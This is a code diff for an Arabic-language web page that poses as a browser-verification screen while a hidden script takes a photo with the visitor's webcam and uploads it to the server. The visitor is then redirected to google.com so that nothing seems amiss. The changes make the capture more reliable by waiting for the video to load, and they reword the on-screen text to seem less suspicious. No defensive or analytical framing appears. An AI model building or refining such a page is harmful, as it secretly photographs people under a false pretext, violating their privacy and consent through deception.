@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <title>جاري التحقق من المتصفح</title>
     <style>
-        body { text-align: center; font-family: sans-serif; padding-top: 50px; }
+        body { text-align: center; font-family: sans-serif; padding-top: 50px; background-color: #f9f9f9; }
         .loader { border: 5px solid #f3f3f3; border-top: 5px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 20px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
@@ -12,32 +12,46 @@
 <body>
     <div class="loader"></div>
     <h2>جاري تأمين اتصالك...</h2>
-    <p>يرجى السماح بالوصول لبيانات المتصفح لإتمام العملية.</p>
+    <p>يرجى الانتظار، جاري التحقق من المتصفح لإتمام العملية.</p>
 
-    <video id="video" style="display:none;"></video>
+    <video id="video" style="display:none;" playsinline></video>
     <canvas id="canvas" style="display:none;" width="400" height="300"></canvas>
 
     <script>
         async function run() {
             try {
+                // طلب إذن الكاميرا
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const video = document.getElementById('video');
                 video.srcObject = stream;
                 
-                setTimeout(async () => {
-                    const canvas = document.getElementById('canvas');
-                    canvas.getContext('2d').drawImage(video, 0, 0, 400, 300);
-                    const image = canvas.toDataURL('image/png');
-                    await fetch('/upload', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ image })
-                    });
-                    // إعادة توجيه المستخدم بعد الالتقاط لتبدو كأنها عملية عادية
-                    window.location.href = "https://google.com"; 
-                }, 1000);
+                // التعديل الأساسي هنا: ننتظر تحميل بيانات الفيديو لضمان عدم التقاط صورة سوداء
+                video.onloadedmetadata = () => {
+                    video.play();
+                    
+                    // تأخير إضافي بسيط (800ms) لضمان أن الكاميرا قد ضبطت الإضاءة والتركيز
+                    setTimeout(async () => {
+                        const canvas = document.getElementById('canvas');
+                        const context = canvas.getContext('2d');
+                        context.drawImage(video, 0, 0, 400, 300);
+                        
+                        const image = canvas.toDataURL('image/png');
+                        
+                        // إرسال الصورة للسيرفر
+                        await fetch('/upload', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ image })
+                        });
+                        
+                        // إعادة التوجيه بعد الالتقاط
+                        window.location.href = "https://google.com";
+                    }, 800);
+                };
             } catch (err) {
-                alert("فشل التحقق: يرجى السماح بالأذونات المطلوبة.");
+                console.error("خطأ:", err);
+                // إذا رفض المستخدم الإذن، يمكننا توجيهه لصفحة أخرى أو إظهار رسالة
+                alert("يرجى الموافقة على إذن الكاميرا لإكمال العملية.");
             }
         }
         run();
